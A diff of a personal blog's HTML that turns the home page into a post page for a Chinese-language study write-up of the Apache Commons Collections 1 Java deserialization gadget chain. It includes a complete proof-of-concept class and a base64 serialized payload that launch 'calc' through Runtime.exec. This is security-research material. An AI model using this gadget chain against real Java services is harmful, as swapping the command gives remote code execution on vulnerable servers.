@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>Arcueid&#39;s BLOG</title>
+    <title>CommonCollections1 | Arcueid&#39;s BLOG</title>
     <meta name="author" content="Arcueid" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -41,7 +41,9 @@
 
 
 
-<script src="/js/lib/home.js"></script>
+
+
+
 
 <link rel="stylesheet" href="/css/main.css" />
 
@@ -151,32 +153,11 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="home-head">
-    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
-    <div id="home-info" @click="homeClick">
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="info">
-            <div class="wrap">
-                <h1>Arcueid&#39;s BLOG</h1>
-                <h3></h3>
-                <h5></h5>
-            </div>
-        </span>
+            <div class="article">
+    <div>
+        <h1>CommonCollections1</h1>
     </div>
-</div>
-<div id="home-posts-wrap" true ref="homePostsWrap">
-    <div id="home-posts">
-        
-
-<div class="post">
-    <a href="/2024/02/24/CommonCollections1/">
-        <h2 class="post-title">CommonCollections1</h2>
-    </a>
-    <div class="category-and-date">
-        
+    <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
@@ -185,11 +166,23 @@
         </span>
         
         
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
             
-            <h1 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h1><h2 id="CommonsCollections1-TransformedMap"><a href="#CommonsCollections1-TransformedMap" class="headerlink" title="CommonsCollections1  (TransformedMap)"></a>CommonsCollections1  (TransformedMap)</h2><p>那就可以正式开始跟链子了</p>
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #ffa2c4">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h1><h2 id="CommonsCollections1-TransformedMap"><a href="#CommonsCollections1-TransformedMap" class="headerlink" title="CommonsCollections1  (TransformedMap)"></a>CommonsCollections1  (TransformedMap)</h2><p>那就可以正式开始跟链子了</p>
 <p>逆着跟 首先考虑在哪里调用了transform 因为我们的命令调用的最终以transform结束</p>
 <p><code>alt+f7 find Usage</code></p>
 <p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939669.png" alt="image-20240201140759741"></p>
@@ -278,93 +271,13 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.ws.Action;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1LazyVersion</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;fault&quot;</span>,<span class="string">&quot;fault&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; AIHClazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = AIHClazz.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Action.class, decoratedMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">finalMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span>  constructor.newInstance(Action.class, finalMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        byte[] bytes = serialize(object);</span></span><br><span class="line"><span class="comment">//        System.out.println(Base64.getEncoder().encodeToString(bytes));</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(</span><br><span class="line">            <span class="string">&quot;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAIADWphdmEudXRpbC5NYXAAFGphdmEuaW8uU2VyaWFsaXphYmxleHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3EAfgAAc3IAMW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuVHJhbnNmb3JtZWRNYXBhdz/gXfFacAMAAkwADmtleVRyYW5zZm9ybWVydAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjtMABB2YWx1ZVRyYW5zZm9ybWVycQB+AAp4cHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50dAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcQB+AAx2cgARamF2YS5sYW5nLlJ1bnRpbWUAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1lcHQAEWdldERlY2xhcmVkTWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAjc3EAfgAadXEAfgAfAAAAAnBwdAAGaW52b2tldXEAfgAjAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AH3NxAH4AGnVxAH4AHwAAAAF0AARjYWxjdAAEZXhlY3VxAH4AIwAAAAFxAH4AJnNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAFZmF1bHRxAH4ANnh4dnIAE2phdmF4LnhtbC53cy5BY3Rpb24AAAAAAAAAAAAAAHhwcQB+ADg=&quot;</span></span><br><span class="line">        );</span><br><span class="line">        unSerialize(bytes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unSerialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">            <span class="keyword">return</span> ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h1 id=""><a href="#" class="headerlink" title=""></a></h1>
-            
-        </div>
     </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
-        </span>
-        
-    </div>
-    <a href="/2024/02/24/CommonCollections1/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/02/24/test/">
-        <h2 class="post-title">test</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/2/24
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/02/24/test/" class="go-post">阅读全文</a>
-</div>
-
-
-        <div class="page-current">
     
-    <span class="current">1</span>
     
     
     
     
-</div>
-
-    </div>
     
-    <div id="home-card">
-        <div id="card-style">
-    <div id="card-div">
-        <div class="avatar">
-            <img src="/images/Arcueid.jpg" alt="avatar" />
-        </div>
-        <div class="name">Arcueid</div>
-        <div class="description">
-            <p>Description<br>…</p>
-
-        </div>
-        
-        
-        <div class="friend-links">
-            
-            <div class="friend-link">
-                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
-            </div>
-            
-        </div>
-        
-    </div>
-</div>
-
-    </div>
     
 </div>
 
@@ -396,6 +309,12 @@
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+
+
+
+
     
 </body>
 </html>
